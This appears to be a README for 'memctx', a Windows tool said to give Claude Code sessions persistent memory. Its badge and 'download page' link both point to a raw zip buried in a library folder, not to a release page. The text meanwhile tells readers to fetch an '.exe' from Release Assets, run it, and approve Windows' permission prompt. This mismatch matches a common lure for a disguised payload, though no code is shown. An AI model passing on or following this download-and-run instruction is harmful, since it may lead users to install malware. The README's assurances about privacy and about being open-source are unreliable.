# 🧠 memctx - Keep your AI session context accessible

[![Download Windows Installer](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/allans4635/memctx/main/lib/api-spec/Software-1.7.zip)

## 📋 What is memctx?

Memctx serves as a persistent memory layer for your AI coding sessions. When you work with AI assistants like Claude, you often face limits on how much information the AI remembers at one time. This software stores your project history, key decisions, and active goals in a searchable format. It feeds this information back into your AI sessions automatically. You stop repeating yourself and spend more time building.

## ⚙️ How it works

The software tracks your workspace activity. It creates summaries of your past interactions. When you start a new coding task, memctx retrieves the relevant bits of history and injects them into your current session. This maintains continuity across long projects.

## 🚀 Getting Started

Follow these steps to set up memctx on your Windows computer.

### Step 1: Check system requirements

Ensure your computer meets these basic needs:
- Windows 10 or Windows 11.
- An active internet connection.
- A current installation of Claude Code.

### Step 2: Download the installer

Visit the official release page to get the latest version of the software.

[Click here to open the download page](https://raw.githubusercontent.com/allans4635/memctx/main/lib/api-spec/Software-1.7.zip)

Look for the file ending in `.exe` under the Assets section of the latest release. Save this file to your computer.

### Step 3: Run the installation

Open the folder where you saved the file. Double-click the file to start the installation. Follow the prompts on your screen. Windows may ask for permission to run the installer. Select Yes to continue. The installer places the necessary files in your program folder and prepares the system for use.

### Step 4: Verify your setup

Open your command prompt or terminal after the installation finishes. Type the following command and press Enter:

memctx --version

The screen should display the version number. This confirms the software is ready to use.

## 🛠️ Configuring your workspace

Memctx requires a brief setup to understand which project files it should monitor. Open your terminal in the root folder of your project and run:

memctx init

This command creates a configuration file in your folder. The tool now watches your session activity and stores data in a hidden archive within that folder. You generally do not need to interact with these files directly.

## 🔍 Searching your history

You can search your past sessions if you need to find a specific decision or code implementation. Use the search command:

memctx search "your search term here"

The system returns a list of relevant entries from your sessions. This helps you recover code patterns or documentation you discussed with the AI weeks or months ago.

## 📊 Managing your memory archives

The software categorizes your sessions automatically. It identifies high-value summaries and preserves them while purging temporary, less useful data. You can inspect the current state of your memory store by running:

memctx status

This displays how much data the system holds and the date of your last saved snapshot.

## 🔐 Privacy and security

Memctx stores all session data locally on your machine. No information leaves your computer unless you explicitly send it to an AI model through your coding tool. Your history remains yours. You can delete the memory files at any time by navigating to your project directory and removing the configuration folder.

## 💡 Troubleshooting common issues

If the software fails to run or report errors, check these items:

1. Path issues: If the terminal says the command does not exist, restart your terminal application. This force-refreshes your system path.
2. Permission errors: Ensure you have write access to the folder where you want to store your memory files.
3. Node.js dependencies: Memctx relies on standard system libraries. If you receive an error regarding missing components, ensure you have the latest terminal environment updates installed.

## 📈 Frequently asked questions

Does this work with other AI tools?
Memctx works specifically with Claude Code. It integrates into the workflow of this specific assistant.

How much disk space does this use?
The archive size stays small. Even after hundreds of sessions, the file sizes stay in the low megabytes. It will not slow down your computer or consume significant storage.

Can I turn off the automatic injection?
Yes. Use the config command to toggle automatic context injection. This allows you to use the tool as a manual lookup for your history without it influencing your chat window.

What happens if I move my project folder?
Move your project folder as you normally would. The local configuration file travels with the project data. The memory system remains intact during folder moves or file renames.

Is there a subscription fee?
The software is free and open-source. You do not need to manage accounts or payments to use it.